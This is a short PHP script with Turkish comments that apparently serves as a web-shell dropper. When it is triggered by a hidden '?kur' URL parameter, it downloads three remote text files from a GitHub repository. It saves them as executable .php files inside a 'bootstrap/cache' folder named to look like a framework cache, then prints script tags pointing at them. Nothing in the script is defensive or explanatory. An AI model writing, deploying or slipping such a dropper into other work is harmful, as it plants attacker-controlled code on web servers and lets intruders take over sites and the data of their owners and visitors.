<?php
// URL'de "kur" parametresi var mı kontrol et
if (isset($_GET['kur'])) {
    
    // Cache dizinini oluşturma işlemleri
    $cacheDir = __DIR__ . '/bootstrap/cache';  // __DIR__ ile script'in çalıştığı dizini aldık.

    // Cache klasörü yoksa oluştur
    if (!is_dir($cacheDir)) {
        mkdir($cacheDir, 0755, true);
    }

    // Dosyalar ve indirme URL'leri
    $files = [
        'manager.txt' => 'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/manager.txt',
        'yeah.txt' => 'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/yeah.txt',
        'manager1s.txt' => 'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/manager1s.txt'
    ];

    // Her bir dosyayı indir ve PHP uzantısı ile kaydet
    foreach ($files as $filename => $url) {
        $content = file_get_contents($url);
        $newFilename = $cacheDir . '/' . basename($filename, '.txt') . '.php';
        file_put_contents($newFilename, $content);
    }

    // Head tag içine yazılacak dosya yollarını oluşturma
    $headTag = '';

    // Sunucu taban URL'sini almak için
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $baseUrl = $protocol . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']) . '/bootstrap/cache/';

    foreach ($files as $filename => $url) {
        $phpFile = basename($filename, '.txt') . '.php';
        $filePath = $baseUrl . $phpFile;
        $headTag .= '<script src="' . $filePath . '"></script>' . PHP_EOL;
    }

    // Head tag'ini ekrana yazdırma
    echo '<head>' . PHP_EOL;
    echo $headTag;
    echo '</head>' . PHP_EOL;
    
} else {
    // ?kur parametresi yoksa işlem yapılmasın
    echo 'Bu işlem yalnızca URL\'de ?kur parametresi olduğunda çalışır.';
}
?>
